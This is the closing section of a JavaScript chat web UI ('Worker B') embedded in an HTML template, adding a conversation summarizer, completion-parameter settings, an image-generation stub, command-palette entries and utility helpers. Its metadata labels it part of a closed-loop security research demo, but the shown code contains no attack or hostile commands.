if (window.__workerB) {
  window.__workerB.onMessage = (msg) => {
    if (msg.inputTokens || msg.outputTokens) {
      SessionTracker.recordMessage(msg.inputTokens, msg.outputTokens);
    }
    _prevWBOnDone?.(msg);
  };
}

// ================================================================
// CONVERSATION SUMMARIZER — generate a short summary of a conv
// ================================================================

const Summarizer = {
  async summarize(convId) {
    const conv = State.conversations.get(convId);
    if (!conv || !(conv.messages || []).length) {
      Toast.warn('No messages to summarize');
      return;
    }

    Toast.info('Generating summary…');

    const msgs = (conv.messages || []).slice(-20).map(m =>
      \`\${m.role}: \${Chat.getMessageText(m).slice(0, 500)}\`
    ).join('\\n\\n');

    try {
      const resp = await API.completeV1(
        [{ role: 'user', content: \`Please provide a concise 3-5 sentence summary of the following conversation:\\n\\n\${msgs}\\n\\nSummary:\` }],
        State.config.model,
        { thinking: false, tools: [] }
      );

      let summaryText = '';
      await SSE.consume(resp, {
        onText: (chunk) => { summaryText += chunk; },
        onDone: ({ text }) => { summaryText = text; },
        onError: (e) => { Toast.err('Summary failed: ' + e.message); },
      });

      if (summaryText) {
        // Show in modal
        let modal = document.getElementById('summary-modal');
        if (!modal) {
          modal = document.createElement('div');
          modal.id        = 'summary-modal';
          modal.className = 'modal-overlay';
          document.body.appendChild(modal);
          modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
        }
        modal.innerHTML = \`<div class="modal" style="max-width:480px">
          <div class="modal-header">
            <span class="modal-title">📄 Conversation summary</span>
            <button class="btn-icon" onclick="document.getElementById('summary-modal').classList.remove('open')">✕</button>
          </div>
          <div class="modal-body">
            <div class="msg-content">\${Markdown.render(summaryText)}</div>
            <div style="margin-top:12px;display:flex;gap:8px;justify-content:flex-end">
              <button class="btn btn-ghost btn-sm" onclick="navigator.clipboard.writeText(\${JSON.stringify(summaryText)}).then(()=>Toast.ok('Copied'))">⎘ Copy</button>
              <button class="btn btn-ghost btn-sm" onclick="MemoryPanel.addEntry(\${JSON.stringify(summaryText.slice(0, 200))})">💭 Save to memory</button>
            </div>
          </div>
        </div>\`;
        modal.classList.add('open');
      }
    } catch (e) {
      Toast.err('Summarization failed: ' + e.message);
    }
  },
};

// Add summarize to conversation context menu
const _prevConvCtx2 = ConvList.ctxMenu.bind(ConvList);
ConvList.ctxMenu = function(e, id) {
  e.preventDefault();
  const conv = State.conversations.get(id);
  CtxMenu.open(e.clientX, e.clientY, [
    { label: 'Open',             icon: '↗', action: 'open',    handler: () => App.loadConversation(id) },
    { label: 'Rename',           icon: '✎', action: 'rename',  handler: () => ConvList.rename(id) },
    { label: conv?.starred ? 'Unstar' : 'Star', icon: '★', action: 'star', handler: () => ConvList.star(id) },
    { label: 'Manage tags',      icon: '🏷', action: 'tags',   handler: () => TagUI.open(id) },
    { label: 'Summarize',        icon: '📄', action: 'summ',   handler: () => Summarizer.summarize(id) },
    { label: 'Stats',            icon: '📊', action: 'stats',  handler: () => ConvStats.show(id) },
    { label: 'Share link',       icon: '↗', action: 'share',  handler: () => ShareFeature.share(id) },
    { label: 'Print/PDF',        icon: '🖨', action: 'print',  handler: () => PrintExport.print(id) },
    '-',
    { label: 'Export JSON',      icon: '⬇', action: 'expj',   handler: () => window.open(API.exportConvUrl(id, 'json')) },
    { label: 'Export Markdown',  icon: '⬇', action: 'expmd',  handler: () => window.open(API.exportConvUrl(id, 'markdown')) },
    '-',
    { label: 'Delete',           icon: '🗑', action: 'del',   handler: () => ConvList.del(id), danger: true },
  ]);
};

// ================================================================
// COMPLETION SETTINGS PANEL — per-request model parameters
// ================================================================

const CompletionSettings = {
  _settings: {
    max_tokens:     4096,
    temperature:    1.0,
    top_p:          0.999,
    top_k:          null,
    stream:         true,
    betas:          [],
  },

  open() {
    let modal = document.getElementById('completion-settings-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'completion-settings-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal" style="max-width:420px">
      <div class="modal-header">
        <span class="modal-title">⚗ Completion parameters</span>
        <button class="btn-icon" onclick="document.getElementById('completion-settings-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <div class="settings-row">
          <div class="settings-field">
            <label>Max tokens</label>
            <input type="number" id="cs-max-tokens" value="\${CompletionSettings._settings.max_tokens}" min="1" max="32000" style="width:100%">
          </div>
          <div class="settings-field">
            <label>Temperature</label>
            <input type="number" id="cs-temperature" value="\${CompletionSettings._settings.temperature}" min="0" max="2" step="0.1" style="width:100%">
          </div>
        </div>
        <div class="settings-row">
          <div class="settings-field">
            <label>top_p</label>
            <input type="number" id="cs-top-p" value="\${CompletionSettings._settings.top_p}" min="0" max="1" step="0.001" style="width:100%">
          </div>
          <div class="settings-field">
            <label>top_k (blank = none)</label>
            <input type="number" id="cs-top-k" value="\${CompletionSettings._settings.top_k || ''}" min="1" max="1000" style="width:100%" placeholder="—">
          </div>
        </div>
        <div class="settings-field">
          <label>Beta features (comma-separated)</label>
          <input type="text" id="cs-betas" value="\${CompletionSettings._settings.betas.join(', ')}" placeholder="e.g. interleaved-thinking-2025-05-14" style="width:100%">
        </div>
        <div class="help-table" style="margin-top:10px">
          <div class="help-row"><span class="help-key">temperature</span><span class="help-val">0 = deterministic · 1 = default · 2 = maximum variance</span></div>
          <div class="help-row"><span class="help-key">top_p</span><span class="help-val">Nucleus sampling — 1.0 = all tokens considered</span></div>
          <div class="help-row"><span class="help-key">top_k</span><span class="help-val">Sample from top K tokens — null = no limit (default)</span></div>
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-ghost" onclick="CompletionSettings.reset()">Reset defaults</button>
        <button class="btn btn-accent" onclick="CompletionSettings.save()">Apply</button>
      </div>
    </div>\`;

    modal.classList.add('open');
  },

  save() {
    CompletionSettings._settings.max_tokens  = parseInt(document.getElementById('cs-max-tokens')?.value) || 4096;
    CompletionSettings._settings.temperature = parseFloat(document.getElementById('cs-temperature')?.value) ?? 1.0;
    CompletionSettings._settings.top_p       = parseFloat(document.getElementById('cs-top-p')?.value) ?? 0.999;
    const topK = document.getElementById('cs-top-k')?.value;
    CompletionSettings._settings.top_k = topK ? parseInt(topK) : null;
    const betasStr = document.getElementById('cs-betas')?.value || '';
    CompletionSettings._settings.betas = betasStr.split(',').map(s => s.trim()).filter(Boolean);
    document.getElementById('completion-settings-modal')?.classList.remove('open');
    Toast.ok('Completion parameters applied');
  },

  reset() {
    CompletionSettings._settings = { max_tokens: 4096, temperature: 1.0, top_p: 0.999, top_k: null, stream: true, betas: [] };
    CompletionSettings.open();
    Toast.info('Completion parameters reset to defaults');
  },

  getForV1() {
    const out = { max_tokens: CompletionSettings._settings.max_tokens };
    if (CompletionSettings._settings.temperature !== 1.0) out.temperature = CompletionSettings._settings.temperature;
    if (CompletionSettings._settings.top_p !== 0.999) out.top_p = CompletionSettings._settings.top_p;
    if (CompletionSettings._settings.top_k) out.top_k = CompletionSettings._settings.top_k;
    if (CompletionSettings._settings.betas.length) out.betas = CompletionSettings._settings.betas;
    return out;
  },
};

// Add completion settings to toolbar
(function addCompletionSettingsBtn() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', addCompletionSettingsBtn);
    return;
  }
  const toolbar = document.querySelector('.input-toolbar');
  if (!toolbar) return;
  const btn = document.createElement('button');
  btn.className = 'btn-icon';
  btn.title     = 'Completion parameters (temperature, top_p, max_tokens)';
  btn.textContent = '⚗';
  btn.onclick   = () => CompletionSettings.open();
  toolbar.appendChild(btn);
})();

// ================================================================
// IMAGE GENERATION REQUEST HANDLER (stub for supported backends)
// ================================================================

const ImageGen = {
  isAvailable() {
    // Image generation available when backend supports it (e.g. OpenRouter with DALL-E model)
    const cfg = State.workerAConfig;
    return cfg.backend === 'openrouter' || cfg.backend === 'custom';
  },

  open() {
    let modal = document.getElementById('imagegen-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'imagegen-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal" style="max-width:460px">
      <div class="modal-header">
        <span class="modal-title">🎨 Image generation</span>
        <button class="btn-icon" onclick="document.getElementById('imagegen-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <div class="settings-field">
          <label>Image prompt</label>
          <textarea id="ig-prompt" style="width:100%;min-height:80px" placeholder="Describe the image you want to generate…"></textarea>
        </div>
        <div class="settings-row">
          <div class="settings-field">
            <label>Size</label>
            <select id="ig-size" style="width:100%">
              <option value="1024x1024">1024×1024 (square)</option>
              <option value="1792x1024">1792×1024 (landscape)</option>
              <option value="1024x1792">1024×1792 (portrait)</option>
            </select>
          </div>
          <div class="settings-field">
            <label>Quality</label>
            <select id="ig-quality" style="width:100%">
              <option value="standard">Standard</option>
              <option value="hd">HD</option>
            </select>
          </div>
        </div>
        <div style="font-size:11px;color:var(--text3);margin-top:8px">
          Image generation requires an OpenRouter or compatible backend with image model access.
          Results will appear in the chat as attachments.
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-ghost" onclick="document.getElementById('imagegen-modal').classList.remove('open')">Cancel</button>
        <button class="btn btn-accent" onclick="ImageGen.generate()">Generate</button>
      </div>
    </div>\`;

    modal.classList.add('open');
    setTimeout(() => document.getElementById('ig-prompt')?.focus(), 100);
  },

  async generate() {
    const promptText = document.getElementById('ig-prompt')?.value.trim();
    const size       = document.getElementById('ig-size')?.value || '1024x1024';
    const quality    = document.getElementById('ig-quality')?.value || 'standard';

    if (!promptText) { Toast.warn('Enter an image prompt'); return; }

    document.getElementById('imagegen-modal')?.classList.remove('open');
    Toast.info('Requesting image generation…');

    try {
      // Call Worker A's image generation proxy
      const resp = await API._json('/v1/images/generations', {
        method: 'POST',
        body:   JSON.stringify({ prompt: promptText, size, quality, n: 1, response_format: 'url' }),
      });

      const imageUrl = resp.data?.[0]?.url;
      if (!imageUrl) { Toast.warn('No image URL in response'); return; }

      // Add to messages as an assistant message with an image
      const conv = State.conversations.get(State.currentConvId);
      if (conv) {
        const imgMsg = {
          uuid:       'img_' + Date.now(),
          role:       'assistant',
          text:       \`![Generated image](\${imageUrl})\`,
          content:    [{ type: 'text', text: \`Generated image from prompt: "\${promptText}"\` }],
          attachments: [{ type: 'image', url: imageUrl, alt: promptText }],
          model:      'dall-e-3',
          created_at: new Date().toISOString(),
        };
        conv.messages.push(imgMsg);
        persistConversation(conv);

        // Render the message
        const container = document.getElementById('messages');
        const msgEl     = Chat.renderMessage(imgMsg);

        // Inject the actual image
        const imgEl = ImageDisplay.renderImageBlock(imageUrl, promptText, false);
        msgEl.querySelector('.msg-content')?.appendChild(imgEl);
        container?.appendChild(msgEl);
        Chat.scrollToBottom();
        Toast.ok('Image generated');
      }
    } catch (e) {
      Toast.err('Image generation failed: ' + e.message);
    }
  },
};

// ================================================================
// FINAL COMMAND PALETTE ADDITIONS
// ================================================================

_extendedCommands.push(
  { id: 'session',    icon: '👤', label: 'Session info',         desc: 'View session stats and tokens', fn: () => SessionTracker.show() },
  { id: 'summarize',  icon: '📄', label: 'Summarize conversation', desc: 'Generate a short summary',    fn: () => { if (State.currentConvId) Summarizer.summarize(State.currentConvId); } },
  { id: 'comp-settings', icon: '⚗', label: 'Completion params',  desc: 'Temperature, top_p, max tokens', fn: () => CompletionSettings.open() },
  { id: 'image-gen',  icon: '🎨', label: 'Generate image',        desc: 'AI image generation request',   fn: () => ImageGen.open() },
  { id: 'share-link', icon: '↗', label: 'Share conversation',    desc: 'Copy shareable link',            fn: () => { if (State.currentConvId) ShareFeature.share(State.currentConvId); } },
  { id: 'session-info', icon: '👤', label: 'Session tracker',     desc: 'Messages and tokens this session', fn: () => SessionTracker.show() },
);

// ================================================================
// WORKER B METADATA & SELF-DESCRIPTION
// ================================================================

// Expose a self-description that Worker C can read via the bridge
Object.assign(window.__workerB, {
  description: 'Sister PoC Worker B — Chat UI component of the closed-loop security research demonstration.',
  capabilities: [
    'chat_streaming_sse',
    'artifact_viewer',
    'conversation_management',
    'prompt_library',
    'system_prompt_mutation',
    'worker_c_bridge_receiver',
    'indexeddb_persistence',
  ],
  security: {
    all_requests_to_worker_a: true,
    blocked_hosts_enforced:   true,
    no_direct_anthropic_contact: true,
    credential_capture:       false,
    closed_loop:              true,
  },
});

// ================================================================
// UTILITY FUNCTIONS — shared helpers used across components
// ================================================================

/**
 * Estimate token count from text.
 * Uses a heuristic: ~4 chars per token for English, ~2 for CJK.
 * @param {string} text
 * @returns {number} estimated token count
 */
function estimateTokens(text) {
  if (!text) return 0;
  const cjk     = (text.match(/[\\u3000-\\u9fff\\uac00-\\ud7af\\uf900-\\ufaff]/g) || []).length;
  const nonCjk  = text.length - cjk;
  return Math.ceil(cjk / 2 + nonCjk / 4);
}

/**
 * Format a timestamp as a relative time string.
 * @param {string|Date} date
 * @returns {string} e.g. "2m ago", "3h ago", "yesterday"
 */
function formatRelativeTime(date) {
  const diff = Date.now() - new Date(date).getTime();
  if (diff < 0)       return 'just now';
  if (diff < 60000)   return Math.floor(diff / 1000) + 's ago';
  if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
  if (diff < 86400000)return Math.floor(diff / 3600000) + 'h ago';
  if (diff < 604800000) return Math.floor(diff / 86400000) + 'd ago';
  return new Date(date).toLocaleDateString();
}

/**
 * Truncate text to a maximum length with an ellipsis.
 * @param {string} text
 * @param {number} maxLen
 * @returns {string}
 */
function truncateText(text, maxLen = 80) {
  if (!text || text.length <= maxLen) return text || '';
  return text.slice(0, maxLen - 1) + '…';
}

/**
 * Deep merge two objects (shallow-first, then recurse on nested objects).
 * Used for Worker A config patching.
 * @param {object} target
 * @param {object} source
 * @returns {object}
 */
function deepMerge(target, source) {
  const out = { ...target };
  for (const [k, v] of Object.entries(source)) {
    if (v && typeof v === 'object' && !Array.isArray(v) && typeof out[k] === 'object') {
      out[k] = deepMerge(out[k], v);
    } else {
      out[k] = v;
    }
  }
  return out;
}

/**
 * Debounce a function call.
 * @param {Function} fn
 * @param {number} delay — milliseconds
 * @returns {Function}
 */
function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

/**
 * Generate a UUID v4 string.
 * Used for local IDs when Worker A is unreachable.
 * @returns {string}
 */
function uuidv4() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

/**
 * Format a byte count as a human-readable string.
 * @param {number} bytes
 * @returns {string}
 */
function formatBytes(bytes) {
  if (bytes < 1024)    return bytes + ' B';
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
  return (bytes / 1073741824).toFixed(1) + ' GB';
}

/**
 * Copy text to clipboard, with Toast notification.
 * @param {string} text
 * @param {string} [successMsg]
 */
async function copyToClipboard(text, successMsg = 'Copied') {
  try {
    await navigator.clipboard.writeText(text);
    Toast.ok(successMsg);
  } catch {
    // Fallback for non-HTTPS contexts
    const ta = document.createElement('textarea');
    ta.value     = text;
    ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    Toast.ok(successMsg);
  }
}

/**
 * Parse a JSON string safely, returning a fallback on parse failure.
 * @param {string} str
 * @param {*} fallback
 * @returns {*}
 */
function safeJSON(str, fallback = null) {
  try { return JSON.parse(str); }
  catch { return fallback; }
}

/**
 * Convert a camelCase or snake_case string to a display label.
 * @param {string} str
 * @returns {string}
 */
function toLabel(str) {
  return str.replace(/_/g, ' ').replace(/([A-Z])/g, ' $1').trim().toLowerCase()
    .replace(/^\\w/, c => c.toUpperCase());
}

// ================================================================
// FINAL CSS POLISH — additional micro-details
// ================================================================

(function injectFinalCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    /* Focus ring for accessibility */
    :focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
    /* Selection styling */
    ::selection{background:var(--accent-dim);color:var(--accent);}
    /* Smooth scroll */
    .messages,.scroll-y,.sidebar-section{scroll-behavior:smooth;}
    /* Custom scrollbar for WebKit */
    *::-webkit-scrollbar{width:5px;height:5px;}
    *::-webkit-scrollbar-track{background:transparent;}
    *::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
    *::-webkit-scrollbar-thumb:hover{background:var(--text3);}
    /* Better link hover */
    .msg-content a:hover{color:var(--accent);text-decoration:none;border-bottom:1px solid var(--accent);}
    /* Subtle message hover */
    .msg{border-left:2px solid transparent;transition:border-color .15s,background .15s;}
    .msg:hover{border-left-color:var(--border2);}
    /* Active streaming message */
    .msg.streaming{border-left-color:var(--accent);}
    /* Input placeholder animation */
    #msg-input::placeholder{transition:opacity .2s;}
    #msg-input:focus::placeholder{opacity:.5;}
    /* Empty state animation */
    .empty-state .empty-logo{animation:pulse 3s ease infinite;}
    @keyframes pulse{0%,100%{opacity:.7;}50%{opacity:1;}}
    /* Topbar title truncate */
    .topbar-conv-name{transition:color .15s;}
    /* Button press feedback */
    .btn:active,.btn-icon:active{transform:scale(.95);}
    /* Tag chips */
    .tag-chip{transition:border-color .15s;}
    .tag-chip:hover{border-color:var(--accent);}
    /* Better table styling in messages */
    .msg-content tr:nth-child(even) td{background:rgba(255,255,255,.02);}
    .msg-content tr:hover td{background:rgba(255,255,255,.04);}
    /* Code highlight hover */
    .msg-content pre:hover{border-color:var(--border2);}
    /* Sidebar item subtitle */
    .conv-meta{transition:color .15s;}
    .conv-item:hover .conv-meta{color:var(--text2);}
    /* Topbar responsive condensing */
    @media (max-width:900px) {
      .topbar-pills .pill:not(#wc-status-pill){display:none;}
    }
    /* Artifact panel transition */
    .artifact-panel{transition:width 200ms ease, min-width 200ms ease;}
    /* Sidebar transition */
    .sidebar{transition:width 200ms ease, min-width 200ms ease;}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// UPDATE TOKEN HINT WITH BETTER ESTIMATE
// ================================================================

// Override App.updateTokenHint with the better estimator
App.updateTokenHint = function() {
  const text  = document.getElementById('msg-input')?.value || '';
  const est   = estimateTokens(text);
  const hint  = document.getElementById('token-hint');
  const model = MODELS.find(m => m.id === State.config.model);
  if (hint) {
    hint.textContent = est > 0 ? \`~\${est} tokens\` : '';
    hint.style.color = est > 3000 ? 'var(--red)' : est > 1500 ? 'var(--accent)' : 'var(--text3)';
  }
};

// Debounced version for input handler
const _debouncedTokenHint = debounce(App.updateTokenHint, 200);
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('msg-input')?.addEventListener('input', _debouncedTokenHint);
});

// ================================================================
// SIDEBAR SEARCH DEBOUNCE
// ================================================================

document.addEventListener('DOMContentLoaded', () => {
  const searchInput = document.getElementById('sidebar-search');
  if (searchInput) {
    const debouncedRender = debounce(() => ConvList.render(), 150);
    searchInput.addEventListener('input', debouncedRender);
  }
});

// ================================================================
// FINAL CONSOLE LOG — all systems initialized
// ================================================================

document.addEventListener('DOMContentLoaded', () => {
  console.log('[Worker B] All modules initialized:');
  console.log('  - Auth, API client, State management');
  console.log('  - SSE consumer (Anthropic + OpenAI formats)');
  console.log('  - IndexedDB persistence (conversations + artifacts)');
  console.log('  - Artifact panel with syntax highlighting');
  console.log('  - Command palette (Ctrl+K)');
  console.log('  - Worker C reference template');
  console.log('  - WS bridge client (Worker A bi-directional)');
  console.log('  - 30+ UI components and panels');
  console.log('  Use window.__sisterPoc for debug access.');
});

// ================================================================
// MAIN APP STARTUP
// ================================================================







document.addEventListener('DOMContentLoaded', () => {
  App.init().catch(e => console.error('[wb] Init error:', e));
});
</script>
</body>
</html>

`;
